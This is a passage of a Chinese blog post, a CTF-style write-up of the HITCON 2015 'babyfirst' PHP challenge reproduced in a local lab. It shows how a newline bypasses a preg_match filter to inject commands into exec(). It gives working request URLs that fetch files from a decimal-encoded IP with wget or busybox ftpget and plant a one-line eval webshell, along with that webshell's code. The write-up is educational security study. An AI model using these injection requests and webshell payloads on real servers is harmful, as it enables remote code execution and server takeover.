!preg_match(&#39;&#x2F;^\w+$&#x2F;&#39;, $args[$i]) )</span><br><span class="line">            exit();</span><br><span class="line">    &#125;</span><br><span class="line">    exec(&quot;&#x2F;bin&#x2F;orange &quot; . implode(&quot; &quot;, $args));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>利用上次的环境，把源代码改了一下，这道题也挺有意思的，因为权限分配问题要把该目录下的文件都<code>chmod 777</code>然后根据代码逻辑是为每一个客户端创建一个<code>sandbox/clientip</code>的目录然后通过正则表达式检测所传进来的参数值<code>args</code>，即要求所有的参数都只能为数字和字母。而代码最后行一行<code>/bin/orange</code>最终发现只是<code>/bin/true</code>的软链接，没有任何的作用属于干扰项</p>
+<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>其实这个问题是正则表达式的一个trick。<code>/^\w+$\</code>中的<code>$</code>当遇到一个字符串的结尾是换行符时还是可以匹配的。 利用这个特性，就可以绕过前面的<code>preg_match()</code>检查，同时多出的换行符还可以在<code>exec()</code>函数中执行。 进行简单的测试,访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.86.143:222&#x2F;?args[]&#x3D;xxx%0a&amp;args[]&#x3D;touch&amp;args[]&#x3D;test</span><br></pre></td></tr></table></figure>
+
+<p><code>args</code>中的参数为<code>xxx\n、touch、test</code>，这三者都可以通过<code>preg_match()</code>的检查，此时<code>exec</code>中执行的命令为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;bin&#x2F;orange xxx</span><br><span class="line">touch test</span><br></pre></td></tr></table></figure>
+
+<p>这样既可在后台看到创建了一个名为test的文件</p>
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>由于<code>preg_match()</code>使用的是<code>\w</code>来进行检查，所有的<strong>斜线、破折号和点(,-,.)</strong>都无法使用。在这种情况下如何创建文件，写入<code>webshell</code>呢?尝试直接写入文件肯定是不行的，因为<code>&#39;</code>也是无法使用的。</p>
+<h5 id="1-wget下载文件"><a href="#1-wget下载文件" class="headerlink" title="1-wget下载文件"></a>1-wget下载文件</h5><p>因为无法直接创建文件，所以便想到了下载文件？而下载文件有几种方式？首先我们来尝试<code>wget</code>因为要使用<code>wget</code>所以一定需要用到<code>ip</code>地址，但是<code>ip</code>地址里面有<code>.</code> 怎么办呢？</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">printf(&quot;%u&quot;, ip2long(&quot;192.168.43.229&quot;));</span><br></pre></td></tr></table></figure>
+
+<p>bingo！既然小数点不能用那我们就用<code>ip</code>的十进制得到<code>3232246757</code></p>
+<p>我们先在本地首页写个<code>phpinfo</code>测试一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.86.143:222&#x2F;?args[]&#x3D;xxx%0a&amp;args[]&#x3D;wget&amp;args[]&#x3D;3232246757</span><br></pre></td></tr></table></figure>
+
+<p>然后我们在后台可以看到下载到了一个<code>index.html</code>文件</p>
+<p><img src="/img/rce_7.png" alt=""></p>
+<p>但是可以明显看到下载到了文件，但是<code>index.html</code>的内容是<code>phpinfo()</code>返回之后的内容，变成了已经解析过后的<code>html</code>文件，而不是<code>php</code>的源代码。</p>
+<p>那应该怎么办呢？</p>
+<h5 id="2-php执行代码"><a href="#2-php执行代码" class="headerlink" title="2-php执行代码"></a>2-php执行代码</h5><p>在<code>linux</code>中我们可以使用<code>php</code>这条命令执行非压缩的打包的PHP文件</p>
+<p>测试一哈</p>
+<ol>
+<li>创建一个<code>1.php</code>,内容为<code>&lt;?php echo &quot;this is a test&quot;;?&gt;</code></li>
+<li>通过<code>tar</code>将<code>1.php</code>打包,<code>tar cvf test 1.php</code></li>
+<li><code>PHP</code>运行<code>test</code>文件</li>
+</ol>
+<p><img src="/img/rce_8.png" alt=""></p>
+<p>可以看到运行了该<code>test</code>文件</p>
+<p>那这样就可以写入一个包含<code>php</code>代码的<code>html</code>文件，然后利用<code>tar</code>和<code>PHP</code>命令执行该文件</p>
+<p>而该<code>html</code>文件内容可以是往服务器写入一句话木马的文件</p>
+<p>在本机<code>index.html</code>写入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">file_put_contents(&#39;shell.php&#39;, &#39;</span><br><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type: text&#x2F;plain&quot;);</span><br><span class="line">print eval($_POST[&quot;cmd&quot;]);</span><br><span class="line">?&gt;</span><br><span class="line">&#39;);</span><br></pre></td></tr></table></figure>
+
+<p>然后<code>wget</code>下载文件并且执行即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.86.143:222&#x2F;?args[]&#x3D;xxx%0a&amp;args[]&#x3D;mkdir&amp;args[]&#x3D;exploit   创建exploit文件夹</span><br><span class="line">http:&#x2F;&#x2F;192.168.86.143:222&#x2F;?args[]&#x3D;xxx%0a&amp;args[]&#x3D;cd&amp;args[]&#x3D;exploit%0a&amp;args[]&#x3D;wget&amp;args[]&#x3D;3232246757  进入exploit文件夹，下载192.168.43.229的index.html文件。</span><br></pre></td></tr></table></figure>
+
+<p>此时后台看到已经下载到了<code>index.html</code></p>
+<p>然后利用执行代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.86.143:222&#x2F;?args[]&#x3D;xxx%0a&amp;args[]&#x3D;tar&amp;args[]&#x3D;cvf&amp;args[]&#x3D;archived&amp;args[]&#x3D;exploit</span><br></pre></td></tr></table></figure>
+
+<p>将<code>exploit</code>文件夹打包为<code>archived</code>文件，最后就是<code>php</code>解释执行<code>archived</code>文件了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.86.143:222&#x2F;?args[]&#x3D;xxx%0a&amp;args[]&#x3D;php&amp;args[]&#x3D;archived</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/rce_9.png" alt=""></p>
+<p>接着就是用菜刀访问连接了，但是我<code>ubantu</code>好像出问题了不知道是不是版本的问题一直连不上qaq</p>
+<h4 id="官方解法"><a href="#官方解法" class="headerlink" title="官方解法"></a>官方解法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir orange</span><br><span class="line">cd orange</span><br><span class="line">wget HEXED_IP</span><br><span class="line">tar cvf payload orange</span><br><span class="line">php payload</span><br></pre></td></tr></table></figure>
+
+<h4 id="奇技"><a href="#奇技" class="headerlink" title="奇技"></a>奇技</h4><p><a href="http://drops.xmd5.com/static/drops/web-9845.html" target="_blank" rel="noopener">HITCON CTF 2015 Quals Web 出題心得</a></p>
+<p>这里利用<code>busybox</code>这个工具。通过<code>busybox</code>中的<code>ftpget</code>的下载命令为:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">busybox ftpget -u ftp的用户名 -p ftp的密码 ftp地址 需要下载的文件名</span><br></pre></td></tr></table></figure>
+
+<p>首先我们需要搭个<code>ftp</code>服务器，然后在<code>ftp</code>务器上面创建一个<code>shell.php</code>文件，内容为</p>
+<p><code>&lt;?php @eval($_POST[&#39;x&#39;])?&gt;</code>.<br>那么即可免去<code>wget</code>中繁琐的解析步骤，tql</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.86.143:222&#x2F;?args[]&#x3D;xxx%0a&amp;args[]&#x3D;busybox&amp;args[]&#x3D;ftpget&amp;args[]&#x3D;%2du&amp;args[]&#x3D;ftp123&amp;args[]&#x3D;%2dp&amp;args[]&#x3D;123456&amp;args[]&#x3D;3232246757&amp;args[]&#x3D;shell.php</span><br></pre></td></tr></table></figure>
+
+<p>直接从远程的<code>ftp</code>服务器上面下载<code>php</code>文件，此<code>php</code>文件就是一个简单的一句话木马。</p>
+<p>成功地下载了<code>shell.php</code>文件，菜刀连接即可</p>
+
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure class="avatar avatar-lg">
+          <img src="/avater.jpg" alt="...">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>comical</div>
+      <div>2019-04-29</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/web/">web</a>
+
+      <a class="tag-link" href="/tags/rce/" rel="tag">#rce</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
